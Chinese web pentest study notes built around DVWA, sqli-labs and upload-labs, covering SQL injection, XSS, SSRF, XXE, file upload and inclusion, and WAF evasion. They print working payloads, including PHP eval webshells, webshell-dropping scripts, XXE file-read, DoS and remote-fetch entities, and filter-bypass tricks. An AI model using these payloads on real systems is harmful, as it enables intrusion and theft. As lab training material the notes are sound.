# Web渗透

## SQL注入

### 基础知识

* **information_schema**

默认数据库

记住三个表名

![image-20210322125208904](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322125208904.png)

* **SCHEMATA**

  存储用户创建的所有数据库库名

  记录数据库库名字段——==SCHEMA_NAME==

  <img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322125404507.png" alt="image-20210322125404507" style="zoom:50%;" />

* **TABLES**

  存储用户创建的所有数据库的库名和表名

  记录数据库库名字段——==TABLE_SCHEMA==

  记录表名字段——==TABLE_NAME==

* **COLUMNS**

  存储用户创建的所有数据库的库名==TABLE_SCHEMA==、表名==TABLE_NAME==和字段名==COLUMN_NAME==



### Select语法

```mysql
select * from [table] where [column] = 'sth';
select * from [table] where [column] >= [number];
select [column1],[column2] from [table];
## num1 < column < num2
select [column1],[column2] from [table] where [column] > [num1] and [column] < [num2];
select [column1],[column2] from [table] where [column] between [num1] and [num2]; 
select [column1],[column2] from [table] where [column] > [num1] or [column] < [num2];
select [column1],[column2] from [table] where [column] in (num1,num2,num3); # column = num1, num2, num3
## column ≠ sth
select * from [table] where [column] != 'sth';
select * from [table] where [column] not like 'sth'
## 模糊查询，'_'占1位 '%'占多位
select * from [table] where [column] like '_sth%'
# 其他
# concat：连接字符串
select group_concat(schema_name) from information_schema.schemata
```

### 数字型注入&字符型注入

#### 数字型注入

```mysql
select * from [table] where id = [x]
## 使用and 1=1 & and 1=2
select * from [table] where id = [x] and 1=1 # 永真，回显正常
select * from [table] where id = [x] and 1=2 # 永假，回显错误
```

#### 字符型注入

字符型注入需要闭合单引号

```mysql
select * from [table] where id = '[x]'
## 使用and 1=1 & and 1=2
select * from [table] where id = 'x and 1=1' # '[x] and 1=1'为一个字符串，无法判断
## 构造 x' and '1'='1
select * from [table] where id = 'x' and '1'='1' # 永真
select * from [table] where id = 'x' and '1'='2' # 永假
```



### Union注入

#### **union联合查询**

* 需要两条或以上的select语句，用union连接
* 查询结果的字段要一致

![image-20210322102706720](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322102706720.png)

#### Order by

使用order by爆出字段数量

```mysql
select * from [table] where id = 1 order by [number]
# number 表示第几个栏位，若number大于字段数则会报错
# payload: 1' order by [number]
# 若number=3时正常回显，number=4时报错或者页面返回结果不同，则代表select字段数为3
# 可以构造
```

![image-20210322100543931](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322100543931.png)![image-20210322101639688](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322101639688.png)

#### 常用函数

database(); version(); user()

```mysql
# payload : 1' union select 1,version()#
select * from users where id = 1 union select 1,version()#
```

<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210321203902612.png" alt="image-20210321203902612" style="zoom:80%;" />![image-20210322103244477](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322103244477.png)

#### 查询表名

```mysql
select table_name from information_schema.tables where table_schema='dvwa';
# payload
1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#
```

<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322155646437.png" alt="image-20210322155646437" />

<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322155810342.png" alt="image-20210322155810342" style="zoom: 67%;" />

#### 查询字段名

通过database()查到库名，再从默认库中查到表名，最后查字段名

```mysql
select column_name from information_schema.columns where table_schema='dvwa' and table_name='users';
# payload
1' union select 1,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
```

<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322160802772.png" alt="image-20210322160802772" style="zoom:50%;" />

<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322161050538.png" alt="image-20210322161050538" style="zoom: 50%;" />

#### 查询数据

```mysql
select user from dvwa.users;
# payload
1' union select user from dvwa.users#
```

<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210322162705736.png" alt="image-20210322162705736" style="zoom:70%;" />

### 盲注

指sql语句执行后不会回显

**常用函数**

* substr()

  * substr(string, pos, len) : 从pos开始取长度为len的子串
  * substr(string, pos) : 从pos开始取到string的最后

* substring()

  同substr()

* left()&right()

  * left(string, len) & right(string, len) : 从左或从右取长为len的子串

* limit

  * limit pos,len :返回从0开始的len个值

* ascii() & char()

  * ascii() 转ascii码，char()转字符

#### 布尔盲注

只会返回yes/no

* **猜测数据库长度**

  ```mysql
  # payload
  1' and length(database())>=1#
  1' and length(database())>=2#
  ....
  1' and length(database())>=n#
  # 当n-1返回真，n返回假时，说明数据库长度为n-1
  ```

* **猜测数据库名**

  ```mysql
  # substr——截取字符
  # payload
  1' and substr(database(),1,1)='a'#
  1' and substr(database(),1,1)='b'#
  ...
  1' and substr(database(),1,1)='z'#
  # 可利用burp爆破
  # ascii为字符对应编码
  1' and ascii(substr(database(),1,1))=97#
  1' and ascii(substr(database(),1,1))=98#
  ....
  # 可利用burp爆破
  ```

  

#### 报错盲注

* 仅代入进行sql查询而没有一个合适的数据返回点（不会回显databse()等信息)
* 页面上回显数据的报错信息

##### updatexml()

* 用于更新xml
* 非法传参故意报错
* 原理过程同extractvalue()

```
# payload
1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)#
# 回显 XPATH syntax error: '~root@~'
```

##### extractvalue()

**原理**

```
extractvalue(xml_document,Xpath_string) # 原型
xml_document是string格式，为xml文档对象的名称
Xpath_string是xpath格式的字符串
```

```mysql
select * from security.users where id = 1 and (extractvalue('anything',concat('~',(select database()))));
## 第一个参数随便写，第二个参数使用~（或者0x7e）使其不满足xpath格式，括号内写select语句，语句会将报错信息也即查询结果回显
```

* concat('a', 'b') = "ab"
* '~'可替换为'#' '$'等不满足xpath格式的字符（目的是为了让其报错）
* extractvalue最大长度字符串为32，超32需要limit分页或者substring()截取

```mysql
# payload
1' and (extractvalue('anything',concat('~',(select database()))))--+
# 回显
XPATH syntax error:'~[database]'
# payload
1' and (extractvalue(0x7e,concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1))))--+
# limit 0,1 ----- 表中的第0项
# limit 1,1 ----- 表中的第1项
# 数据多的可以放入burp爆破 limit选项
```



#### 时间盲注

由于sql中的and语句，当and前为真时才会执行and后的语句

```mysql
# 构造延时payload
1' and sleep(5)#
# 对应sql
select * from [table] where id = '1' and sleep(5)#
```

### 堆叠查询注入

原理：**通过加 ‘；’ 执行多条sql语句**

当常用字段被过滤时可以使用

### Sqlmap

```shell
sqlmap.py -u "http://192.168.58.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=sc98fvrf13qhrslu29k491pj86"
```



### 二次注入

* **将攻击语句写入数据库**

  对特殊字符进行转义处理，在写入数据库时又保留原来的数据

* **引用攻击语句**

  

```mysql
# id=admin'#
# sql
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
# 效果 需要输入当前密码 但是已经被'#'注释掉了，因此可以绕过密码验证直接修改admin的密码
UPDATE users SET PASSWORD='[anything]' where username='admin'#' and password='[nothing]'
```

### mysql加解密注入

* 传参可能会进行base64、md5等加密操作
* 我们传参也可以通过base64等编码注入攻击参数

```
# payload先进行加密，再注入
```

### 宽字节注入

* 传入的单引号被转义('\\')（防止注入
* addslashes()
* php中的magic_quotes_gpc

**字节覆盖**

* 英文字母1个字节

  \ ~> %5c

  ' ~> %27

* 希腊字母2个字节

  β的url编码为%df，使用它将'\\'覆盖

* 中文字符3个字节

  %df%5c是一个中文字符

```mysql
# 在普通注入的'前加了反斜杠\
# payload ---> sql报错
?id=1' ---> select * from users where id='1\''
# 在'前加%df，由于%df%27是一个中文字符
# payload ---> url ---> sql
?id=1%df' ---> ?id=1%df%5c%27 ---> where id='連''
# payload 
?id=-1%df' union select 1,database(),user()--+
```

**嵌套查询**

```mysql
# 查表名
select table_name from information_schema.tables where table_schema='[database]';
# 由于 ' 被过滤，因此将查询语句嵌套与另一查询语句中来绕过过滤
select table_name from information_schema.tables where table_schema=(select database());
# 查字段相同
select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1) limit 0,1
# 若需要查询其他字段或者表名则更改limit即可
```

### Post注入&Cookie注入

原理同Get

Cookie可以使用burp抓包注入cookie

### XFF注入

X-Forward-For

原理同普通sql注入

```mysql
# payload在XFF中
X-Forwarded-for:127.0.0.1' union select 1,database(),3#
```



### Sql注入绕过

#### 大小写绕过

**注入被拦截，有关键词被过滤，尝试将某个字母改成大写**

```
select database() ---> sElect daTaBase()
```

#### 双写绕过

**注入报错，关键词被过滤**

**查看报错信息来确定哪里需要双写**

```mysql
# payload --> Error
id=1 and 1=1 ---> id=1 1=1
# and被过滤，使用双写
# payload ---> sql
id=1 anandd 1=1 ---> id=1 and 1=1
```

#### 编码绕过

* 使用url全编码把关键词编码两次（因为服务器会对URL进行一次解码）
* 使用16进制编码对整个payload进行编码

#### 内联注释绕过

```mysql
# payload
# /*!...*/ 只有在mysql中才会执行
select * from security.users where id=1 union /*!select*/ 1,2,3;
```

#### 空格绕过

使用/**/   ()  `` 等代替空格 

```mysql
select/**/table_name/**/from/**/information_schema....
select(table_name)from(information_schema)....
select`table_name`from`information_schema`....
```

#### or&and&xor&not绕过

* and = &&
* or = ||
* xor = |
* not = !

#### 引号绕过

```
# 16进制转换
select column_name from information_schema.columns where table_name='users';
--->
select column_name from information_schema.columns where table_name=0x7573657273;
# 使用已知查询
select column_name from information_schema.columns where table_schema=database();
# 宽字节注入
```

#### 注释符绕过

```mysql
id=1' union select 1,dabase(),3#
id=1' union select 1,dabase(),3--+
# 注释符被过滤，可添加or或者and语句闭合
id=1' union select 1,dabase(),3 or '1'='1
id=1' union select 1,dabase(),3 and '1'='1
```

#### 大小于号绕过

```
greatest()&least()
strcmp(str1,str2) # str1 < str2 返回-1否则返回1
in & between a and b
```



#### 等号绕过

```
select * from users where id = 1;
# 等价于
select * from users where id like 1;
select * from users where id rlike 1; # 模糊匹配
select * from users where id regexp 1; # 正则匹配
select * from users where id > 1 and id < 3;
select * from users where !(id<>1); # <> 等价于 !=

```

#### 逗号绕过

常用于盲注过滤逗号

```mysql
# ',' ---> from pos for len
select substr("string",1,3);
--->
select substr("string" from 1 for 3);
# ',' ---> join
union select 1,2,3;
--->
union select * from (select 1)a join (select 2)b join (select 3)c;
# ',' ---> offset
select * from users limit 2,1;
--->
select * from users limit 1 offset 2;
```

#### 函数绕过

```mysql
sleep(1) ---> benchmark(10000000,1) # 用于测试执行速度，第一个参数是执行次数，第二个是执行的表达式
ascii() ----> hex() ----> bin() # 进制转换
group_concat("str1","str2") ---> concat_ws(",","str1","str2")
user() ---> @@user # 好像有问题
database() ---> @@database
datadir ---> @@datadir # 好像也有问题
```

## XSS

**Cross-Site Scripting, 跨站脚本攻击**

> 由于开发者对传入的数据过滤不严格导致恶意js代码被执行

**危害**

* 会话劫持（Cookie、Session）
* XSS Worm蠕虫（以XSS攻击微博为例）
  1. 发表一条正常微博，记录articleid
  2. 获取用户userid，获取html源码并将userid拆分出来
  3. 构建用户并转发微博的url，插入xss蠕虫代码
  4. 当其他用户转发微博时，就完成了蠕虫攻击

**修复**

* java中过滤xss漏洞的第三方组件：OWASP Esapi、JSOUP、xssproject
* httponly：对防御xss漏洞不起作用，目的是为了解决xss漏洞后序的cookie劫持（阻止客户端脚本访问Cookie）

### 反射型

```
# payload
<script>alert('xss')</script>
# 若输入框有长度限制
# 可以检查->修改输入框maxlength属性
# 一般xss注入后都要给别的用户访问
# 直接给链接太明显，可以使用百度短网址
```

### 存储型

攻击脚本将被存放于数据库中

只要访问页面就会执行恶意代码

### DOM型

**Document Object Model：定义了访问和操作html文档的标准方法**

```php+HTML
<a href='"+str+"'>what do you see?</a>
# payload
'><img src="#" onmouseover="alert('xss')">
## 当鼠标移动到图片上时弹出弹窗
# payload
' onclick="alert('xss')">
## 点击时弹出弹窗
```

XSS平台：将JS代码组成的统一性的功能并将数据显示出来

https://xsshs.cn/xss.php

## CSRF

**Cross-site request forgery跨站请求伪造**

> 攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。

* XSS利用的是站点内的信任用户
* CSRF通过伪装成受信任用户请求受信任网站

**伪造**

* 先正常请求，找出CSRF漏洞
* 构造格式和正常请求相同的payload
* 抓取受信任用户的数据包，伪造为受信任用户把payload发给服务器
* 或者欺骗用户访问恶意url

**防护**

二次确认、验证码、token

## SSRF

**Sever-Side Request Forgery**

* 服务器端请求伪造

* 由攻击者构造请求，由服务器端发起请求

利用参数url的内容，执行file协议或访问其他url

**file协议**

```
?url=file:///C://Users//lenovo//Desktop//shell.php
# 可以访问机器上的文件
```

**篡改网址**

```
?url=192.168.58.1:3306
# 测试访问数据库
```

**防护**

* 限制请求端口只能为web端口
* 限制不能访问内网ip



## 文件上传漏洞

![mind-map.png](https://github.com/c0ny1/upload-labs/blob/master/doc/mind-map.png?raw=true)

![sum_up.png](https://github.com/c0ny1/upload-labs/blob/master/doc/sum_up.png?raw=true)

**目的是getshell**

### 一句话木马

```php
<?php @eval($_POST["wmdx"]); echo "nice"?>
```

**AntSword**

* 连接前清除缓存库

### JS检测绕过

**有弹窗**

**后缀不被允许**

* **直接关闭JS**

  * 打开chrom设置 >> 网站设置 >> 禁用JavaScript

* **删除JS代码**

  * 另存网页为html或者查看源代码复制后保存为html

  * 删除\<script>function()\</script>验证的部分

  * 在html代码的form提交表单那一行加入

    ```html
    action="http://127.0.0.1/upload-labs/Pass-01/index.php
    ```

* **burp抓包改后缀**

  * 写有一句话木马的shell.php先存为shell.jpg
  * 提交shell.jpg后使用burp拦截改为shell.php即上传成功

### Http请求验证绕过（Mime验证）

**Content-Type**

1. 上传shell.php，burp抓包，查看Content-Type为application/octet-stream
2. 将application/octet-stream改为image/jpeg

### 文件后缀绕过

#### phtml

php的其他格式：phtml/php2/php3/php4/ptml等

可将shell.php改为shell.php3/shell.phtml/shell.php.phtml等格式绕过

要使用菜刀连接，antsword连接不了

#### 大小写绕过

.Php .pHp 等

#### Windows系统特性

* 末尾去空
  * windows中文件的后缀后的空格会自动去掉
  * 上传'shell.php'文件，在burp中抓包改为"shell.php "就不会被过滤了
* 末尾去点
  * windows中文件后缀后的点会自动去掉
  * 上传'shell.php'文件，在burp中抓包改为"shell.php."
* ::$DATA文件流
  * windows中在文件流后所有东西都按流处理，不会判断文件名
  * 上传'shell.php'文件，在burp中抓包改为"shell.php::$DATA"

#### . .绕过

**适用条件**

```php+HTML
$file_ext = strrchr($file_name, '.');
```

取最后一个'.'及后面的东西

* 上传'shell.php'文件，在burp中抓包改为"shell.php. ."
* strrchr会把"shell.php. ."改为"shell.php. "
* 由windows系统特性，"shell.php. "会变为"shell.php"

#### 双写绕过

**适用条件**

* 代码把php后缀替换为空
* 双写后缀"shell.pphphp" 替换掉中间的php后变为"shell.php"

### .htaccess绕过

**htaccess文件作用：**

* apache的配置文件
* 可以覆盖服务器的htaccess
* 负责相关目录下的网页配置

```php+HTML
<FileMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FileMatch>
```

### 文件截断绕过

**PHP%00截断**

00代表结束符，会把00后面的所有字符删除

截断条件：

* php版本小于5.3.4
* php的magic_quotes_gpc off

在上传的文件后加入%00

* "shell.php%00.jpg" --> "shell.php"

### 文件包含漏洞

**图片马**

* 上传后的图片马中仍然包含完整的webshell
* 文件包含漏洞可以运行图片马中的恶意代码

**方法**

#### **在图片后添加木马**

* 选择一张.jpg .gif 图片，用notepad++打开并在后面加上一句话木马
* 不可以用记事本，因为记事本没有16进制，添加shell后文件会损坏
* 上传后访问文件路径即可

#### **伪造头部**

* gif的文件头为GIF89A

* notepad++编写

  ```php+HTML
  GIF89a
  <?php @eval($_POST["wmdx"]); echo "nice"?>
  ```

* 伪造为gif文件

#### **getimagesize()**

php的一个获取图片信息的函数，如果没有上传的不是图片则获取不到信息

使用

```shell
cat image.php webshell.php > image.php
```

合并为一个文件再上传即可

#### **exif()**

使用exif()判断imagetype

* 直接在图片后写入木马即可

#### **二次渲染**

imagecreatefromjpeg()重组图片

如果文件末尾有php代码，就会被重组

* 把末尾的php放在图片中部

### 条件竞争

**适用条件**

* 网站允许先上传任意文件，然后检查文件是否包含Webshell脚本，如果包含再删除文件
* 在文件上传和删除文件之间有时间差
* **利用这个时间差完成攻击**

**方法**

* 编写shell.php

  ```php+HTML
  <?php
  $myfile = fopen("shell_17.php", "w") or die("Unable to open file!");
  $txt = '<?php @eval($_POST["wmdx"]); phpinfo();?>';
  fwrite($myfile, $txt);
  fclose($myfile);
  ?>
  ```

* burp抓包放入Intruder，设置一个变量令其不断访问（类似爆破或者DoS）

* 不断在浏览器刷新访问shell.php，有可能能在程序删除shell.php前执行

  也可以编写以下脚本

  ```python
  # coding:utf-8
  import requests
  def main():
      i=0
      while 1:
          try:
              print('第{}次访问'.format(i),end='\r')
              a = requests.get("http://hei.me/upload-labs/upload/shell.php" )
              
              if a.status_code ==200:
                  print('\n'+"OK")
                  break
          except Exception as e:
              pass
          i+=1
  if __name__== '__main__' :
      main()
  ```

* 执行成功后访问shell_17.php即可

### 解析漏洞

#### IIS解析漏洞

* 当建立*.asp / *.asa格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件解析
  * 建立文件夹test.asp，在文件夹内建立test.txt，内容为\<%=NOW()%>
  * 访问http://192.168.58.1/test.asp/test.txt，其中语句会被当做asp脚本解析
* 当文件为*.asp;1.jpg时，IIS 6.0会以asp脚本来执行

#### Apache解析漏洞

* Apache解析文件时碰到不认识的拓展名会从后往前解析一直到拓展名认识
* 若都不认识则会暴露源代码
* 在Apache安装目录下"conf/mime.types"有拓展名列表
  * 例如列表中没有rar，则可以上传shell.php.rar来绕过

#### Php CGI（Nginx）解析漏洞

1. 在php的配置文件中有一个cgi.fi:x_pathinfo
2. 若其开启，在访问url如http://192.168.58.1/shell.txt/shell.php时
3. shell.php是不存在的文件，php会向前解析shell.txt造成解析漏洞

## 文件包含漏洞

**文件包含**

> 简单一句话，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。

**漏洞成因**

* 包含文件时将被包含文件设置为变量
* 若用户对变量的值可控且服务器端未做合理校验或校验被绕过就导致了文件包含漏洞

**PHP文件包含函数**

* include()
* include_once()
* require()
* require_once()

```php+HTML
# php源码
# 无限制文件包含
<?php
$file = $_GET["f"];
include $file;
?>
# 直接上传文件令其包含
# 只能上传html文件
<?php
$file = $_GET["f"];
include $file.".html";
?>
# 远程文件包含
?filename=http://ip/include.txt
```

**截断方法**

* %00截断

  * 条件
    * php需小于5.3

    * magic_quotes_gpc = off

* win下目录长度最长为256字节，超出部分会被丢弃

  * ?filename=index.txt/./.(win下重复256次)
  * ?filename=index.txt....(win下重复256次)

* ?filename=http://ip/include.txt?

* ?filename=http://ip/include.txt%23 （%23=#）

* ?filename=http://ip/include.txt%20 （空格=%20）

**伪协议**

* file:// 读取文件
  
* http://192.168.58.1/test/inc.php?f=file://D:\phpstudy_pro\WWW\test\index.txt
  
* php://filter

  * http://192.168.58.1/test/inc.php?f=php://filter/convert.base64-encode/resource=index.txt读取后再base64解密

* php://input 任意代码执行

  * file_get_contents() 读取post数据

  * 写入木马

    http://192.168.58.1/test/inc.php?f=php://input

    然后写入post数据

    ```php+HTML
    <?php
    $myfile = fopen("shell.php", "w") or die("Unable to open file!");
    $txt = '<?php @eval($_POST["wmdx"]); phpinfo();?>';
    fwrite($myfile, $txt);
    fclose($myfile);
    ?>
    ```

    ```php+HTML
    <?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>
    ```

* data:text/plain

  ```
  ?f=data:text/plain,<?php phpinfo();?>
  ?f=data:text/plain,php语句的base64编码
  ```

* zip://

  可以访问压缩文件中的文件但是需要绝对路径

  ```
  ?f=zip://C:\Users\lenovo\Desktop\shell.zip#shell.php
  # 由于#和url编码的#冲突
  所以改为%23
  ?f=zip://C:\Users\lenovo\Desktop\shell.zip%23shell.php
  ```

## 逻辑漏洞

**越权访问**

* url中的某个参数指向某个用户
* 用户改动参数后服务器没有验证来源
* 服务器返回了另一个用户的信息
* 修复：session

## XXE漏洞

**XML Exeternal Entity XML外部实体注入**

在应用程序解析XML输入时没有禁止外部实体的加载，导致可加载恶意外部文件

**XML**

**DTD（Document Type Definition）**

```xml-dtd
# 常用XML语法结构
<?xml version="1.0"?>
<!DOCTYPE note [
<!ELEMENT note (a,b,c,d)>
<!ELEMENT a (#PCDATA)>
<!ELEMENT b (#PCDATA)>
<!ELEMENT c (#PCDATA)>
<!ELEMENT d (#PCDATA)>
]>
<note>
<a>anything</a>
<b>is</b>
<c>oj</c>
<d>bk</d>
</note>
```

**DTD声明格式**

* 内部声明

  ```xml-dtd
  <!DOCTYPE 根元素 [元素声明]>
  ```

* 引用外部

  ```xml-dtd
  <!DOCTYPE 根元素 SYSTEM "文件名">
  ```

* 引用url

  ```xml-dtd
  <!DOCTYPE 根元素 PUBLIC "url">
  ```

**DTD实体声明**

* 内部声明
* 引用外部

**XML payload**

```xml-dtd
# 任意文件读取
<?xml version="1.0"?>
<!DOCTYPE a [
        <!ENTITY b SYSTEM "file:///c:/windows/win.ini">
]>
<c>&b;</c>
# 拒绝服务
## 许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成DoS
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lolz (#PCDATA)>
 <!ENTITY lol1 "&lol1;&lol1;...;&lol1;">
 <!ENTITY lol2 "&lol2;&lol2;...;&lol2;">
 ...
 <!ENTITY lol9 "&lol9;&lol9;...;&lol9;">
]>
<lolz>&lol9;</lolz>
# 测试开放端口
## 若返回connection refused则端口关闭
<?xml version="1.0"?>
<!DOCTYPE root [
        <!ENTITY portscan SYSTEM "http://xx.xx.xx.xx:81">
]>
<root>&portscan;</root>
# 若web可以通过url利用
<?xml version="1.0"?>
<!DOCTYPE root [
        <!ENTITY exp SYSTEM "http://xx.xx.xx.xx/payload">
]>
<root>&exp;</root>
# 命令执行
<?xml version="1.0"?>
<!DOCTYPE root [
        <!ENTITY content SYSTEM "expect://dir .">
]>
<root>&content;</root>
```

**修复**

* 禁用外部实体libxml_disable_entity_loader(true)
* 过滤用户提交的xml

## RCE漏洞

**remote command/code  execute**远程代码执行

**管道符连接命令**

```shell
ping 127.0.0.1|whoami
# | 直接执行后面语句
ping 1|whoami
# 前错执行后面，前真不执行后面
ping 127.0.0.1&whoami
# 前可真可假，前假则直接执行后面
ping 127.0.0.1&&whoami
# 前假直接报错，不执行后面，前只能真
```

## 命令注入

> **'&&'与'&'的区别**
>
> command 1 && command 2
>
> 先执行1，成功后执行2，否则不执行2
>
> command 1 & command 2
>
> 先执行1，不管是否成功都会执行2

> **管道符'|'**
>
> command 1|command 2
>
> 将1的输出作为2的输入，并且只打印2的结果

# PHP漏洞

## 反序列化



# Nmap

```shell
# root下
# ping扫主机默认1000个高危端口
nmap 192.168.58.1
# ping扫指定端口
nmap -p 1-65535 192.168.58.1
nmap -p 80,1433,3306
# 探测操作系统
nmap -O 192.168.58.1
# ping扫存活主机
nmap -sP 192.168.58.1
# ping扫网段下ip个数
nmap -sP 192.168.58.0/24
# 半开扫描
## 扫描动作极少会被记录，更具有隐蔽性
nmap -sS 192.168.58.1
# 非ping扫，可跳过防火墙
nmap -Pn 192.168.58.1
# 扫端口对应服务的版本信息
nmap -sV 192.168.58.1
# 显示扫描过程（详细）
nmap -vv 192.168.58.1
# 路由追踪
nmap -traceroute 192.168.58.1
# 全面检测
nmap -A 192.168.58.1
# 扫ip目标列表
nmap -iL D:\ip.txt
# 脚本引擎
nmap --script=[scriptname]
```



# WAF

**WAF（Web Application Firewall）**

* 用于屏蔽常见的网站漏洞攻击，如sql注入、xml注入、xss等
* 针对于应用层而非网络层的入侵
* 针对http、https，对web应用提供保护

**基于规则库匹配的waf**

**工作流程：解析http请求 >> 匹配规则 >> 防御动作 >> 记录日志**

* waf对数据包进行正则匹配过滤
* 若匹配到漏洞库的代码，则进行阻断
* 这种waf需要及时更新漏洞库

由工作流程可知绕过只能从解析请求和匹配规则下手

## 判断

**SQLMap**

```shell
sqlmap.py --batch  --identify-waf --random-agent -u "http://www.test.com"
```

**手工**

* ?anything= 1 union select1
* 选取一个不存在的参数，实际上不会对网站系统执行流程造成任何影响，若被拦截则说明存在waf（页面无法访问、响应码不同、返回结果与正常的不同）

## 绕过

### Http请求阶段绕过

* **Http参数污染**

  * 当访问http://192.168.58.1/?str=hello&str=world&str=xxser时，不同的脚本环境的执行结果不同，有的会接收第一个参数，有的会接收最后一个参数

* WAF在未接收到请求之前就会对数据校验，若未发现恶意代码则交给脚本处理

* 若WAF与脚本环境的取值点不同，例如WAF取值验证第一个参数而脚本取值验证最后一个参数

  ```
  # payload	
  test.php?id=1&id=1' union select * from table--
  # 其中waf取id=1，而脚本取id=1' union select
  ```

* asp.net会将多个相同参数项连在一起

  ```
  # payload
  test.php?id=1;&id=s&id=e&id=l&id=e....
  ```

  

### Sql注入绕过

* **大小写转换**

  ```
  # sql
  uNion sElEct 1,2,3
  # xss
  <scRipt>alert(1)</scrIpt>
  ```

* **URL编码**

  将payload进行2次url编码

* **双写关键字**

  ```
  ununionion seselectlect 1,2
  ```

* 

## Bypass

**%00截断**

* shell.php >> shell.php%00.jpg >> %00可以转为url编码

**去掉双引号**

* filename="shell.php" >> filename=shell.php;

**加个单引号**

* “shell.php" >> "'shell.php"

  安全狗匹配不到单引号，会认为是一个错误的请求

**重复filename**

* 令一个filename= ;后面再filename="shell.php"

  因为安全狗匹配到第一个filename后就不会往下匹配第二个filename了

**换行输入**

* 将"shell.php"每一个字母打一个回车

  安全狗只能匹配到filename="s

# 旁注攻击

* **ip反查**
  * http://tool.chinaz.com/Same/
  * http://dns.aizhan.com/
  * http://www.114best.com/ip/
* SQL跨库查询
* 目录越权
* 构造注入点
* CDN

# ARP欺骗



# 环境工具搭建

* windows下wamp

* phpStudy

  * phpMyAdmin

* DVWA

  http://www.dvwa.co.uk/

  * 整个DVWA-master文件夹复制进D:\phpstudy_pro\WWW下然后改名为DVWA

  * 修改D:\phpstudy_pro\WWW\DVWA\config下的config.inc.php.dist后缀为config.inc.php

  * 修改config.inc.php中的数据库配置

    <img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210321100631543.png" alt="image-20210321100631543" style="zoom:50%;" />

  * 打开http://127.0.0.1/DVWA/setup.php，点击create database创建成功后跳到登录界面

  * 默认账号密码为admin/password

* sqli-labs（php5）

  https://github.com/Audi-1/sqli-labs

  * 整个文件夹移到D:\phpstudy_pro\WWW下然后改名为sqli-labs

  *  修改D:\phpstudy_pro\WWW\sqli-labs\sql-connections配置

    <img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210321104019297.png" alt="image-20210321104019297" style="zoom:50%;" />

  * 打开http://127.0.0.1/sqli-labs，创建数据库
  
* sqlilabs（php7）

  https://github.com/Rinkish/Sqli_Edited_Version

  上面这个有些注入页面还有bug

  https://github.com/skyblueee/sqli-labs-php7

  操作相同，php5的版本与php7不兼容，注入后不会回显

  **mysql和mysqli的区别！**

* XSS平台

  * https://xsshs.cn/

  * beef-xss-framework（只有kali有）

* upload-labs

  https://github.com/c0ny1/upload-labs

  https://github.com/c0ny1/upload-labs/releases

* Hydra 
  
  * 暴力破解FTP、Mysql、SSH等